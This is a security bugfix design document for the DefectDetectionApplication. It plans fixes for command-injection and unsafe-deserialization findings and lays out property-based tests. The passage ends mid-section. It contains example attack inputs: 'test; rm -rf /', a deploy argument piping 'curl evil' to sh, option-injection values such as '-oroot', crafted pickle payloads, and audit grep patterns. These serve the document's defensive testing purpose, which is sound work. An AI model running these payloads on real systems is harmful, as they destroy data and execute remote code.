# Security Injection & Deserialization Fixes (Group 1) Bugfix Design

## Overview

A code security review of the DefectDetectionApplication (DDA) — scan
`8f106a76-79c8-46a0-81ce-2775b5841b45`, "DDA Code Review" — surfaced eight
HIGH-severity application-code findings across two vulnerability classes:
**command injection** (untrusted / argument-controlled input reaching a shell
command, directly or via a shell script / SSM `AWS-RunShellScript` document) and
**unsafe deserialization** (`pickle` / `dill` / `torch.load`, all pickle-backed,
which can execute arbitrary code embedded in a crafted payload during
deserialization).

This is the defect: in each of the eight sites an input value crosses into a
shell command or a deserializer without validation, quoting, a safe format, or a
documented + enforced trust boundary. The fix neutralizes every one of those
vectors — malicious input is **rejected** (validation error) or **rendered
inert** (quoted, passed as a non-shell argument, loaded with a safe/`weights_only`
path, or confined to a trust boundary the payload cannot cross) — while keeping
the behavior for every legitimate input **byte-for-byte identical** (`F(X) =
F'(X)` for all non-malicious inputs).

The fix is deliberately minimal and targeted per site. It splits into two risk
tiers:

1. **Pure-validation code fixes (low risk, independently testable):**
   `Snapshotter.take_snapshot` (#1), `deploy.py` SSM args (#2), and
   `utils.run_command` + its two callers (#3). These add an input-validation /
   quoting layer in front of an unchanged shell invocation. They are pure
   functions of their inputs, so both Fix Checking and Preservation Checking are
   expressible as property-based tests over a generatable string domain.

2. **Deserialization changes (higher risk — must preserve the exact
   producer/consumer contract):** the `dill.load` reference-image map (#5), the
   two `pickle` sites in `camera_manager.py` (#6) and
   `digital_input_process_manager.py` (#7), and the `torch.load` model loader
   (#8). Each requires an explicit per-site decision — replace with a safe
   format vs. document + enforce an in-process trust boundary — justified by the
   **actual data source**. The producer/consumer data contract (the exact
   structures round-tripped) must not change.

Finding #4 (`test_docker_profile_selection.py`) is a Semgrep audit hit in a
test file where the subprocess input is derived from static, in-repo script
content; it is resolved with a documented `# nosem` justification rather than a
behavior change (lowest risk).

A **repo audit** (grep for `subprocess` with shell string interpolation, and for
`pickle` / `dill` / `torch.load` on externally-influenced data) is the
exploration test: it must surface these counterexamples on the unfixed tree and
return zero disallowed hits — outside documented, justified exceptions — after
the fix.

Duplicate copies of these files under
`edge-cv-portal/infrastructure/cdk.out/asset.*` are generated CDK build
artifacts that regenerate from source and are **out of scope**; only the real
source paths are fixed.

## Glossary

- **Bug_Condition (C)**: A `CodePath` that carries an untrusted / user-controlled
  (or argument-controlled) input value into a shell command **or** into an
  unsafe deserializer (`pickle` / `dill` / `torch.load`) in a way that can enable
  code or command execution — formally
  `reachesShellCommand(X, untrustedInput(X)) OR reachesUnsafeDeserializer(X, untrustedInput(X))`.
- **Property (P) / Fix Checking**: After the fix, for every buggy input the
  vector is **neutralized** — injection payloads are rejected or rendered inert
  and never reach a shell as executable syntax; a crafted malicious serialized
  payload cannot trigger arbitrary code execution.
- **Preservation**: For every input that does NOT trigger the bug condition, the
  fixed code behaves identically to the original — `F(X) = F'(X)`. Valid
  stationNames still snapshot; valid deploy args still produce the same SSM
  commands; valid usernames/groupnames/paths/modes still run the same privileged
  commands with the same `(success, output)` contract and the same `argv`;
  legitimate serialized data still round-trips; valid model files still load and
  convert.
- **F / F'**: The original (unfixed) code where the input reaches the shell /
  deserializer directly / the fixed code where the vector is validated, quoted,
  replaced with a safe format, or constrained to a documented trust boundary.
- **Injection payload / metacharacter**: A shell-significant sequence
  (`; | & \` $ ( ) < > \n`, backticks, quotes) or an **option-injection** value
  (a value beginning with `-`, interpreted by the invoked tool as a flag).
- **`--` sentinel**: The POSIX end-of-options marker; arguments after it are
  treated as operands, neutralizing option injection for tools that honor it
  (`useradd`, `userdel`, `groupadd`, `groupdel`, `gpasswd`, `chmod`, `chown`,
  `chgrp`).
- **Trust boundary (in-process)**: A serialized payload whose producer and
  consumer are the same process (or a `BaseManager`/shared-memory peer the OS
  isolates to the same trust domain), so no external actor can substitute the
  bytes. Where chosen over a format change, it is **documented in-code** and
  **enforced** (the load path cannot be reached by externally-supplied bytes).
- **`weights_only=True`**: The `torch.load` mode (PyTorch ≥ 1.13) that restricts
  the unpickler to tensor/primitive types, so a `.pt` file cannot execute
  arbitrary code during load.

## Bug Details

### Bug Condition

The bug manifests on any application-code path that carries an input value into a
shell command or an unsafe deserializer without neutralization. The eight sites
are: `stationName` → shell script (#1); argparse args → SSM shell commands (#2);
username/groupname/path/mode → privileged `subprocess.run` (#3); static snippet →
`bash -c` in a test (#4, audit-only); `reference_image_map_file` → `dill.load`
(#5); camera frame payload → `pickle.loads` (#6); shared-memory health message →
`pickle.loads` (#7); user-supplied `.pt` → `torch.load` (#8).

**Formal Specification:**
```
FUNCTION isBugCondition(X)
  INPUT: X of type CodePath   // an application code path that carries an input
                              // value into a shell command or a deserializer
  OUTPUT: boolean

  RETURN reachesShellCommand(X, untrustedInput(X))        // command injection
      OR reachesUnsafeDeserializer(X, untrustedInput(X))  // pickle/dill/torch.load
END FUNCTION
```

**Expected behavior for buggy inputs (Fix Checking):**
```
FOR ALL X WHERE isBugCondition(X) DO
  result := F'(X)
  ASSERT neutralized(result)
     // command injection: metacharacter / option-injection payloads are
     //   REJECTED (validation error) or rendered INERT (quoted / passed as a
     //   non-shell argument) — never reach a shell as executable syntax.
     // deserialization: a crafted malicious payload CANNOT trigger arbitrary
     //   code execution (safe format, weights_only, or a documented + enforced
     //   trust boundary the payload cannot cross).
END FOR
```

### Examples

Command injection (bug manifestation on unfixed code):

- `take_snapshot("test; rm -rf /")` → builds
  `path = "/aws_dda/system/snapshot-test; rm -rf /-<ts>.tar"` and runs
  `sh /snapshot/snapshot.sh <path>`; the shell script can interpret `; rm -rf /`.
  Expected after fix: rejected with HTTP 400 (invalid `stationName`).
- `deploy.py --platform 'aarch64; curl evil|sh'` → f-string-interpolated into an
  `AWS-RunShellScript` command string executed on the EC2 instance. Expected
  after fix: quoted/allowlisted so it cannot execute injected commands.
- `create_user("-oroot")` / `chmod("/x", "-R,u+s")` → a value beginning with `-`
  is parsed by `useradd` / `chmod` as an option (option injection). Expected
  after fix: rejected, or neutralized by a `--` sentinel so it is treated as an
  operand.
- Edge (test-only, audit): `test_docker_profile_selection.py` runs
  `subprocess.run(["bash", "-c", snippet])` where `snippet` is built from
  static in-repo script content — no untrusted input actually reaches it.

Unsafe deserialization (bug manifestation on unfixed code):

- A crafted `reference_image_map_file` whose pickle stream contains a
  `__reduce__` payload executes code during `dill.load(handle)` (#5).
- Corrupted / substituted pickle bytes from the frame path or the shared-memory
  buffer execute code during `pickle.loads(...)` (#6, #7).
- A malicious `.pt` at a user-supplied `model_s3_uri` executes code during
  `torch.load(model_path, map_location='cpu')` (#8).
- Edge (preserved, NOT buggy): the legitimate, application-generated reference
  map / camera frame `{'data','height','width'}` dict / health `{'status',
  'error_type','last_updated'}` message, and a benign state-dict/checkpoint `.pt`
  — all must still load into the identical structures.

## Expected Behavior

### Preservation Requirements

**Unchanged Behaviors:**
- `take_snapshot` with a valid `^[a-zA-Z0-9_-]+$` `stationName` constructs the
  same `snapshot-<stationName>-<timestamp>.tar` path, invokes the same snapshot
  script, and returns the same `"snapshotfile/<file>.gz"` string (Req 3.1).
- `deploy.py` with legitimate args constructs equivalent SSM commands and
  deploys / runs the longevity tests unchanged (Req 3.2).
- `run_command` and the user-group / filesystem utilities with valid
  usernames/groupnames/paths/modes create/delete users and groups and apply
  `chmod`/`chown`/`chgrp` exactly as before, returning the same
  `(success, output)` contract and the same argument vector to `subprocess.run`
  (Req 3.3).
- The docker-profile-selection tests continue to exercise the real script
  decision block and pass; the `tegra`/`generic` assertions and regression
  guards are unchanged (Req 3.4).
- A legitimate reference-image map, camera frame payload, and shared-memory
  health message still deserialize into the same structures, and the
  postprocessor, camera preview/capture path, and health-report path behave
  identically (Req 3.5).
- A legitimate PyTorch model (raw state dict, checkpoint, or JIT model) still
  inspects to the same detected metadata and produces the same generated DDA
  package; the hardened load path still loads the intended tensors (Req 3.6).

**Scope:**
All inputs that do NOT trigger the bug condition must be completely unaffected.
This explicitly includes:
- Valid `stationName` / deploy-arg / username / groupname / path / mode values.
- Mouse-free, legitimate serialized payloads produced in-process by trusted
  producers (the `BaseManager`-hosted `Camera`, the process-local shared-memory
  writer, the application's own reference-map generator).
- Benign model checkpoints, including full-checkpoint loads that legitimately
  require `weights_only=False` (handled via an allowlisted-trusted-source path,
  below).
- The review's out-of-scope findings (IAM/authorization, S3 bucket-squatting,
  auth/crypto, dependency/supply-chain, sensitive-data/Bandit B105 hardcoded
  strings including the AWS credentials embedded in `deploy.py`'s SSM commands,
  and production-readiness/docs), and the generated CDK artifacts under
  `edge-cv-portal/infrastructure/cdk.out/asset.*` — all left unchanged (Req 3.7).

**Note:** The expected correct behavior for buggy inputs is defined in the
Correctness Properties section (Property 1); this section focuses on what must
NOT change.

## Hypothesized Root Cause

The code was written for a trusted, single-tenant operational context, so inputs
were assumed benign at the point they reached a shell or a deserializer. The
concrete causes, per class:

1. **String concatenation into a shell path (#1).** `stationName` is joined into
   a filename with no character allowlist; the resulting path is passed as an
   argument to `sh /snapshot/snapshot.sh`, and the script re-expands it.

2. **f-string interpolation into shell command strings (#2).** `deploy.py`
   builds `AWS-RunShellScript` command lists by f-string-substituting argparse
   values; SSM runs them through a shell, so any metacharacter is live. (The
   adjacent embedded-credentials issue is a *separate* group and is not fixed
   here.)

3. **Generic `subprocess.run(command)` with no input constraint (#3).** The
   arg-list form (no `shell=True`) already blocks classic metacharacter
   injection, but the callers pass user-influenced `username` / `groupname` /
   `path` / `mode` straight through, so an **option-injection** value (leading
   `-`) is interpreted as a flag by the invoked tool. Semgrep also flags the
   non-static `subprocess.run` itself.

4. **Dynamic subprocess in a test (#4).** `bash -c snippet` trips the audit even
   though `snippet` is static in-repo content — a false-positive that needs a
   recorded rationale.

5. **Pickle-family deserializers used as a convenient object transport (#5–#8).**
   `dill`/`pickle`/`torch.load` were chosen because they round-trip arbitrary
   Python objects with one call. The risk depends entirely on **who can supply
   the bytes**:
   - `reference_image_map_file` (#5) is **config-driven** and may be externally
     supplied → highest deserialization risk.
   - The camera frame payload (#6) is produced by an **in-process,
     `BaseManager`-hosted `Camera`** → the bytes never leave the trust domain.
   - The health message (#7) is written to a **process-local shared-memory
     buffer** by the same component that reads it → in-process trust domain.
   - The `.pt` at `model_s3_uri` (#8) is **user-provided** and pickle-backed →
     highest deserialization risk (RCE in the Lambda).

## Correctness Properties

Property 1: Bug Condition — Injection / deserialization vectors neutralized

_For any_ code path where the bug condition holds (`isBugCondition` returns true
— an untrusted or argument-controlled input reaches a shell command or an unsafe
deserializer), the fixed code SHALL neutralize the vector: command-injection
metacharacter and option-injection payloads are **rejected** (validation error /
client error) or **rendered inert** (quoted, or passed as a non-shell operand,
including via a `--` sentinel) so they never reach a shell as executable syntax;
and a crafted malicious serialized payload **cannot trigger arbitrary code
execution** because it is loaded with a safe format, with `weights_only=True`, or
only from a documented + enforced in-process trust boundary the payload cannot
cross. A full-repo audit for the bug-condition patterns finds no remaining
disallowed occurrence in the in-scope application code, other than occurrences
carrying a documented, justified exception.

**Validates: Requirements 2.1, 2.2, 2.3, 2.4, 2.5, 2.6, 2.7, 2.8, 2.9**

Property 2: Preservation — No behavior change for legitimate inputs

_For any_ code path where the bug condition does NOT hold (`isBugCondition`
returns false), the fixed code SHALL produce the same result as the original
code (`F(X) = F'(X)`), preserving: the snapshot path/return for valid
stationNames; the SSM command strings for valid deploy args; the `(success,
output)` contract and the exact `argv` passed to `subprocess.run` for valid
usernames/groupnames/paths/modes; the docker-profile-selection test behavior; the
round-trip structures of the reference-image map, camera frame payload, and
shared-memory health message; and the inspected metadata and generated DDA
package for legitimate model files (including full checkpoints loaded via the
allowlisted-trusted-source path).

**Validates: Requirements 3.1, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7**

## Fix Implementation

### Changes Required

Assuming the root-cause analysis is correct, each site gets the minimal change
that makes `isBugCondition` false for it while preserving `F(X) = F'(X)`.

#### #1 — `src/backend/snapshot/Snapshotter.py` (Req 2.1)

**Function**: `take_snapshot(stationName)`

1. **Allowlist-validate** `stationName` against `^[a-zA-Z0-9_-]+$` at the top of
   the function; on mismatch (or empty) raise `HTTPException(status_code=400,
   detail=...)` before constructing the path or calling `subprocess`.
2. **Defense-in-depth path constraint**: build the file name, then resolve the
   full path with `pathlib` and assert it stays within `/aws_dda/system/` (e.g.
   `Path("/aws_dda/system") / file` and verify `resolved.parent ==
   Path("/aws_dda/system")`), so no `../` or absolute-path escape is possible
   even if the allowlist were relaxed later.
3. Leave the `subprocess.check_output(["sh", "/snapshot/snapshot.sh", path])`
   call and the `"snapshotfile/" + file + ".gz"` return **unchanged** for valid
   names (preservation). The timestamp component is unchanged.

#### #2 — `src/edgemlsdk/src/test/longevity/deploy.py` (Req 2.2)

**Functions**: `main(args)` command-list construction (and the argparse layer).

1. **Allowlist-validate** each interpolated argument as it is read: `platform`,
   `ubuntu_version`, `python_version`, `region`, `mqtt_endpoint`, `release_date`
   against conservative patterns (e.g. `^[A-Za-z0-9._:-]+$`; `release_date`
   `^\d{8}$`); numeric args (`longevity_hours`, `payload_size`) are already typed
   `int` by argparse — keep that. Reject on mismatch with a clear error (argparse
   `error()` / `ValueError`).
2. **Quote at the interpolation site**: wrap every interpolated value in
   `shlex.quote(str(value))` when building each command string in
   `download_edgemlsdk_release_artifacts` and `run_mqtt_longevity`, so even an
   allowed-but-surprising value cannot break out of its shell token. Validation +
   quoting are complementary (allowlist rejects, quote neutralizes).
3. Do **not** touch the embedded `credentials.access_key`/`secret_key` values —
   that hardcoded-credential adjacency is a separate remediation group; only the
   injection vector is in scope. (Quoting them is acceptable as it does not
   change the credential handling; do not otherwise alter them.)
4. For valid inputs the constructed command strings are **equivalent** —
   `shlex.quote` is a no-op on tokens with no shell-significant characters, so
   typical values (`aarch64`, `22.04`, `3.11`, `us-west-2`, an 8-digit date)
   serialize identically (preservation).

#### #3 — `src/backend/utils/utils.py` + callers (Req 2.3)

**Function**: `run_command(command)` and its callers in
`user_group_management_utils.py` and `filesystem_management_utils.py`.

1. Keep `run_command` in its **arg-list, no-`shell=True`** form — this is already
   the correct primitive and must not regress. Add a `# nosem` / comment
   documenting that it never uses a shell and that operand validation is enforced
   at the callers (below).
2. **Neutralize option injection at the callers** using a `--` end-of-options
   sentinel where the tool supports it, placing user-influenced operands after
   `--`:
   - `create_user`: `['useradd', ..., '--', username]` (flags like `--uid` /
     `-g` stay before `--`).
   - `delete_user`: `['userdel', '--', username]`.
   - `create_group`: `['groupadd', ..., '--', groupname]`.
   - `delete_group`: `['groupdel', '--', groupname]`.
   - `add_user_to_group` / `remove_user_from_group`: `gpasswd` — keep the
     `-a`/`-d` flag, then `'--', groupname` … (validate `username`; `gpasswd`'s
     operand order is `gpasswd -a user group`, so apply validation to `username`
     and use `--` before the trailing operands as the tool allows).
   - `chmod` / `chown` / `chgrp`: place `path` (and the `owner`/`groupname`/
     `mode` where applicable) after `--`, e.g.
     `['chmod', mode, '--', path]`, `['chown', owner, '--', path]`,
     `['chgrp', groupname, '--', path]` (and the `-R` variants).
3. **Allowlist-validate** the identity operands that a `--` sentinel does not
   fully cover: reject `username`/`groupname` not matching a POSIX-name pattern
   (e.g. `^[a-z_][a-z0-9_-]*$`), and reject a `mode` not matching a
   symbolic/octal `chmod` pattern. Raise a clear error on rejection.
4. Preservation: for valid operands the argument vector after adding `--` is
   semantically identical (the tools treat post-`--` tokens as the same
   operands), and the `(success, output)` return contract is unchanged. Tests
   assert the **exact argv** produced for valid inputs.

> Design note: `--` vs. rewrite. We prefer the `--` sentinel + allowlist over
> rewriting each caller's flag handling because it is the smallest change that
> both satisfies the audit and provably preserves the operand semantics. Where a
> specific tool does not honor `--` for a given operand, fall back to allowlist
> rejection for that operand.

#### #4 — `test/backend-test/host_scripts/test_docker_profile_selection.py` (Req 2.4)

1. Add a documented `# nosem: <rule-id>` (and a short comment) on the
   `subprocess.run(["bash", "-c", snippet], ...)` line recording that `snippet`
   is derived from **static, in-repo script content** extracted by regex from a
   checked-in `.sh` file, is **test-only**, and carries no untrusted input.
2. No behavioral change; the tests continue to run the real decision block and
   pass unchanged (preservation, Req 3.4).

#### #5 — `supervised_bbox_stage1_postprocessor.py` (Req 2.5) — **safe format**

**Decision: replace `dill` with a safe format (JSON + numpy).** Rationale: the
`reference_image_map_file` is **config-driven** (`config1['reference_image_map_file']`)
and may be **externally supplied**, so it is outside any in-process trust
boundary — a documented boundary cannot be enforced here. The payload is a simple
mapping `image_index: {path -> feature_vector}`, which serializes cleanly without
pickle.

1. Define a safe on-disk format: a JSON sidecar for the `path` keys plus a
   `.npz`/`.npy` for the stacked feature vectors (or a single `.npz` with an
   object array of paths + a float matrix of features). Load with
   `numpy.load(..., allow_pickle=False)` and `json.load`.
2. Preserve the exact in-memory result: `self.train_feature_gallery =
   np.vstack(train_feature_gallery)` and the ordered `self.reference_image_paths`
   must be identical to what `dill.load` produced, so the downstream
   nearest-neighbor lookup is unchanged (Req 3.5).
3. Provide a one-time **migration/loader shim**: if only a legacy `dill` map
   exists, load it **once behind an explicit, documented trusted-conversion
   path** (or a separate offline conversion utility) and write the safe format;
   the runtime `__init__` load path uses only the safe format. Do not silently
   `dill.load` externally-supplied files at inference time.

#### #6 — `src/backend/utils/camera_manager.py` (Req 2.6) — **trust boundary (documented + enforced)**

**Decision: document + enforce the in-process trust boundary; no external
data is deserialized.** Rationale: the producer of the frame bytes is the
**in-process, `BaseManager`-hosted `Camera`** object — `Camera.get_frame()`
returns `pickle.dumps({'data','height','width'})` and the *same* module's
`_get_camera_frame` calls `pickle.loads(camera.get_frame())`. The bytes never
originate outside the application's own process group; no network / user / file
input crosses this path.

1. **Preferred hardening (format change):** replace the pickle transport with a
   non-executable serialization of the fixed `{'data','height','width'}` shape —
   e.g. a small struct/JSON header (`height`, `width`) plus the raw `data`
   bytes, or `numpy` `tobytes()`/`frombuffer` — since the payload is a flat dict
   of bytes + two ints. This eliminates the deserializer entirely and is the
   robust outcome; keep the exact dict shape so `pickle.loads` callers become
   the new decoder with identical output (Req 3.5).
2. **If the `BaseManager` proxy contract makes a format change impractical**
   (the manager may itself pickle the return value across the proxy), fall back
   to: add an explicit in-code comment documenting the enforced trust boundary
   (producer and consumer are the same in-process `BaseManager` Camera; no
   untrusted bytes reach this path) and a `# nosem: <rule-id>` justification, and
   ensure the load site cannot be reached by any externally-supplied bytes. This
   is the "documented + enforced trust boundary" branch permitted by Req 2.6.
3. Either way the null/timeout paths (`return pickle.dumps(None)` →
   `pickle.loads(...)` yielding `None`) preserve the existing
   error/None-handling contract that `get_camera_frame` relies on.

#### #7 — `src/backend/utils/digital_input_process_manager.py` (Req 2.7) — **safe format (JSON) over a documented boundary**

**Decision: replace `pickle` with a JSON-serializable health message; the buffer
is a process-local shared-memory region (in-process trust boundary), and the
message is trivially JSON-representable.** Rationale: `__update_health_status`
writes `pickle.dumps({'status', 'error_type', 'last_updated'})` into a
`shared_memory.SharedMemory` block that `get_dio_process_health_report` reads via
`pickle.loads(__shm.buf)`. The buffer is **process-local** (named
`dda_dio_mem_block_process_<workflow_id>`), so the trust boundary already holds;
switching to JSON also removes the deserializer with a tiny, faithful change.

1. Serialize the message as UTF-8 JSON: encode `status` (a
   `DIOProcessHealthStatusEnum`) as its value/name, `error_type` as its string
   form (it is already stringified in the `error` handling elsewhere), and
   `last_updated` as the float timestamp. Length-prefix or NUL-terminate so the
   reader parses exactly the written bytes out of the 1 MB buffer (the current
   code writes `buf[:len(pickled)]` and reads the whole `buf`, so define a clear
   framing — e.g. write a 4-byte length header then the JSON).
2. `get_dio_process_health_report` parses the framed JSON with `json.loads` and
   reconstructs the same dict shape (mapping `status` back to the enum), so all
   callers see the identical message structure (Req 3.5).
3. Document the process-local trust boundary in-code as defense-in-depth.

> Design note: #6 vs #7. We choose a **format change** for #7 because the health
> message is small and trivially JSON-representable, making the safe-format path
> essentially free. For #6 we prefer a format change but allow a
> **documented+enforced boundary** fallback because the frame travels across the
> `BaseManager` proxy, whose own (de)serialization is not fully under this call
> site's control; forcing a format change there could alter the proxy contract
> (a preservation risk). Both outcomes satisfy their requirement.

#### #8 — `edge-cv-portal/backend/functions/model_converter.py` (Req 2.8) — **`weights_only=True` + trusted-source allowlist**

**Functions**: `inspect_pytorch_model(model_path)` (`torch.load(model_path,
map_location='cpu')`) and the `convert_model` request path that supplies
`model_s3_uri`.

1. **Default to `torch.load(model_path, map_location='cpu', weights_only=True)`**
   so a malicious `.pt` cannot execute code during load. This is the primary
   neutralization.
2. **Restrict the source**: validate `model_s3_uri` against an allowlist of
   trusted buckets/accounts (config-driven) before download, rejecting anything
   else with a 400. This narrows the attack surface even for the
   `weights_only=False` fallback below.
3. **Legitimate full-checkpoint fallback (preservation for Req 3.6):** some
   valid inputs are *not* pure weights — JIT models (`hasattr(model_data,
   'graph')`) and full-model objects (`is_full_model`) and some framework
   checkpoints cannot load under `weights_only=True`. Design:
   - Attempt `weights_only=True` first.
   - On the specific unpickling/`weights_only` failure, **only if the source is
     on the trusted-bucket/account allowlist**, retry with `weights_only=False`
     under a documented "allowlisted-trusted-source" branch (comment + audit
     log). If the source is not allowlisted, surface the error instead of
     silently loading executable pickle.
   - This preserves the existing detection logic (state-dict vs. checkpoint vs.
     JIT vs. full-model) and the generated DDA package for legitimate models,
     while ensuring `weights_only=False` is reachable only for trusted sources.
4. Keep `inspect_pytorch_model`'s broad `except` → "Could not inspect model"
   contract so a rejected/failed load degrades exactly as today for callers.

#### #9 — Repo audit (Req 2.9)

Add/keep a repo-audit check (see Testing Strategy) that greps for the
bug-condition patterns and asserts zero disallowed hits in in-scope application
code, allowing only occurrences carrying a documented `# nosem`/comment
exception (the #4 test line, and any #6 documented-boundary fallback).

### Ordering and risk

1. **Pure-validation fixes first (#1, #2, #3, #4)** — low risk, independently
   testable as pure functions of their inputs; land and property-test these
   before touching any deserialization path.
2. **Deserialization format changes (#7, #5)** next — #7 (health message) is the
   smallest faithful format change; #5 (reference map) needs the migration shim
   but has a simple payload. Both must reproduce the exact consumer structures.
3. **#6 (camera frame)** — prefer the format change but validate the
   `BaseManager` proxy round-trip carefully; use the documented-boundary fallback
   if a format change would alter the proxy contract. This is the highest
   preservation risk among the pickle sites (it is on the live preview/capture
   hot path).
4. **#8 (model_converter)** — `weights_only=True` plus the allowlisted-trusted-
   source fallback; the fallback design is what preserves legitimate
   full-checkpoint / JIT / full-model loads (Req 3.6).
5. **Repo audit (#9)** last, as the gate that proves no disallowed pattern
   remains.

**Highest-risk areas to watch:** the camera-frame transport (#6, live hot path
and `BaseManager` proxy serialization) and the model_converter fallback (#8,
must not regress legitimate non-weights checkpoints).

## Testing Strategy

### Validation Approach

Two phases: first surface counterexamples that demonstrate the injection /
deserialization vectors on the **unfixed** tree (repo audit + targeted
exploit-shaped tests), then verify the fix **neutralizes** every buggy input
(Fix Checking) and **preserves** behavior for every legitimate input
(Preservation Checking, `F(X) = F'(X)`). Property-based testing (Hypothesis — the
repo already vendors `.hypothesis/`) is emphasized wherever the input domain is
generatable.

### Exploratory Bug Condition Checking

**Goal**: Surface counterexamples that demonstrate each vector BEFORE the fix and
confirm/refute the root-cause analysis. If refuted, re-hypothesize.

**Test Plan**: Write tests that feed metacharacter / option-injection / crafted-
payload inputs into each site and observe the unsafe outcome on unfixed code
(shell-executable syntax reaching the command, or code execution during
deserialization). Run the repo audit to enumerate all sites.

**Test Cases**:
1. **Snapshotter injection** (#1): call `take_snapshot("a; touch /tmp/pwn")` and
   assert the metacharacter reaches the `path` argument (will fail-safe only
   after fix; on unfixed code the path contains the payload).
2. **deploy.py injection** (#2): build the command lists with
   `--platform "x; touch /tmp/pwn"` and assert the raw payload appears
   unquoted in the constructed SSM command string (counterexample on unfixed
   code).
3. **run_command option injection** (#3): call `create_user("-oroot")` /
   `chmod("/x", "-x")` and assert the leading-`-` value is passed as a bare
   operand with no `--` guard (counterexample on unfixed code).
4. **Deserialization RCE** (#5, #6, #7, #8): construct a crafted payload whose
   `__reduce__` sets a sentinel (e.g. writes a temp file / flips a flag) and load
   it via the site's deserializer on unfixed code; assert the sentinel fires
   (demonstrates code execution). For #8 use a crafted `.pt`.
5. **Repo audit** (#9): `grep` the in-scope tree for the patterns below; every
   hit on the unfixed tree is a counterexample where `isBugCondition` is true.

**Repo-audit grep patterns** (must be non-empty on unfixed, zero disallowed hits
after fix — minus documented exceptions):
- Shell/subprocess interpolation:
  `subprocess\.(run|call|check_output|check_call|Popen)` combined with
  f-string / `%` / `.format(` / `+`-built command arguments, and any
  `shell=True`.
- SSM shell docs: `AWS-RunShellScript` with f-string-built `commands`.
- Deserializers: `\bpickle\b`, `\bdill\b`, `pickle\.loads?`, `dill\.loads?`,
  `torch\.load\(` (flagging any without `weights_only=True`).
- Scope excludes `edge-cv-portal/infrastructure/cdk.out/asset.*` (generated).

**Expected Counterexamples**:
- Non-empty audit hits across the eight sites.
- Injection payloads appear unquoted / as options in the constructed commands.
- Crafted deserialization payloads execute the sentinel on unfixed code.

### Fix Checking

**Goal**: For all inputs where the bug condition holds, the fixed code
neutralizes the vector.

**Pseudocode:**
```
FOR ALL input WHERE isBugCondition(input) DO
  result := fixedFunction(input)
  ASSERT neutralized(result)
END FOR
```

Concretely:
- #1: generated strings containing shell metacharacters → `take_snapshot` raises
  HTTP 400 (rejected); no metacharacter reaches `path` (Req 2.1).
- #2: generated metacharacter-laden args → each is `shlex.quote`d and/or rejected
  by the allowlist; the constructed SSM command contains no live metacharacter
  (Req 2.2).
- #3: generated option-injection inputs (leading `-`) for
  username/groupname/path/mode → rejected by the allowlist or placed after `--`
  so the tool treats them as operands (Req 2.3).
- #4: the audit rule is satisfied via the documented `# nosem` (Req 2.4).
- #5/#6/#7/#8: a crafted malicious payload cannot execute code — safe-format
  loaders (`json`/`numpy allow_pickle=False`) reject/ignore it (#5, #7),
  `weights_only=True` refuses it (#8), and the trust-boundary path is
  unreachable by external bytes (#6) (Req 2.5–2.8).
- #9: post-fix repo audit returns zero disallowed hits (Req 2.9).

### Preservation Checking

**Goal**: For all inputs where the bug condition does NOT hold, the fixed code
produces the same result as the original — `F(X) = F'(X)`.

**Pseudocode:**
```
FOR ALL input WHERE NOT isBugCondition(input) DO
  ASSERT originalFunction(input) = fixedFunction(input)
END FOR
```

**Testing Approach**: Property-based testing is recommended because these are
pure functions over generatable domains (strings, argument values, serialized
payloads); it explores many inputs automatically and catches edge cases example
tests miss. Capture baseline behavior on the **unfixed** code first, then assert
the fixed code matches.

**Property-based test plans, per finding (where the domain is generatable):**

- **#1 Snapshotter `stationName`**: generate strings with shell metacharacters →
  assert `take_snapshot` **rejects** (HTTP 400); generate valid
  `^[a-zA-Z0-9_-]+$` names → assert the **same** constructed path
  (`snapshot-<name>-<ts>.tar`, timestamp pinned/mocked) and the same
  `"snapshotfile/<file>.gz"` return as `F`.
- **#2 deploy.py args**: generate metacharacter-laden args → assert
  quoted/rejected; generate valid args (platform/version/region/date shapes) →
  assert the constructed SSM command **strings are equivalent** to `F`'s (quote
  is a no-op on clean tokens).
- **#3 utils.run_command**: generate option-injection inputs (leading `-`) for
  `username`/`groupname`/`path`/`mode` → assert **rejected or neutralized via the
  `--` sentinel**; generate valid inputs → assert the **same `(success, output)`
  contract** and the **same `argv`** passed to `subprocess.run` (mock
  `subprocess.run`, compare the exact list) as `F`.
- **#5/#6/#7/#8 deserialization**: assert a **crafted malicious payload cannot
  execute code** (weights_only rejects it / JSON or numpy `allow_pickle=False`
  path / unreachable-by-external-bytes boundary); assert **valid payloads still
  round-trip / load** — the reference map yields the identical
  `train_feature_gallery` + ordered `reference_image_paths`; the camera frame
  yields the identical `{'data','height','width'}` dict (and `None` on
  timeout/failure); the health message yields the identical `{'status',
  'error_type','last_updated'}` dict; and legitimate `.pt` files (state dict,
  checkpoint, JIT, full-model) yield the identical inspected metadata and
  generated package.

**Example-based preservation cases**:
1. **#4 docker-profile tests**: run the existing suite; the `tegra`/`generic`
   decision assertions and regression guards pass unchanged (Req 3.4).
2. **#8 full-checkpoint**: a legitimate checkpoint that requires
   `weights_only=False` from an **allowlisted** source loads via the documented
   trusted-source fallback and produces the same metadata/package (Req 3.6).
3. **Out-of-scope untouched**: assert the CDK `cdk.out/asset.*` copies and the
   embedded-credential lines in `deploy.py` are unchanged (Req 3.7).

### Unit Tests

- #1: valid-name path/return; rejection of metacharacter and path-escape names.
- #2: equivalence of constructed SSM command strings for canonical valid args;
  rejection/quoting for metacharacter args.
- #3: exact-`argv` assertions for `create_user`/`delete_user`/`create_group`/
  `delete_group`/`add_user_to_group`/`remove_user_from_group` and
  `chmod`/`chown`/`chgrp` (with and without `-R`), plus option-injection
  rejection; `(success, output)` contract on `run_command`.
- #4: presence of the documented `# nosem` and unchanged decision-block behavior.
- #5/#6/#7: round-trip of a legitimate payload into the exact structures; a
  crafted payload does not execute (sentinel not fired).
- #8: `weights_only=True` default; malicious `.pt` refused; state-dict/checkpoint/
  JIT/full-model metadata unchanged; source-allowlist enforced.

### Property-Based Tests

- #1: generate `stationName` strings across metacharacter and valid domains;
  invariant — rejected xor same-path-and-return-as-`F`.
- #2: generate argument tuples; invariant — no live metacharacter in the
  constructed command; valid tuples produce `F`-equivalent command strings.
- #3: generate username/groupname/path/mode including leading-`-` and embedded
  metacharacters; invariant — rejected or safe-operand (`--`) placement; valid
  values produce the exact `F` `argv` and `(success, output)`.
- #5/#7 (and #6 if format-changed): generate valid payload structures; invariant
  — safe-format round-trip equals the pickle/dill round-trip of `F`; generate
  crafted payloads; invariant — no code execution.

### Integration Tests

- #1: end-to-end snapshot request with a valid `stationName` returns the same
  gz path; a malicious `stationName` returns HTTP 400.
- #3: exercise the user/group and filesystem management flows end-to-end with
  valid inputs (create/delete user & group, chmod/chown/chgrp) and confirm
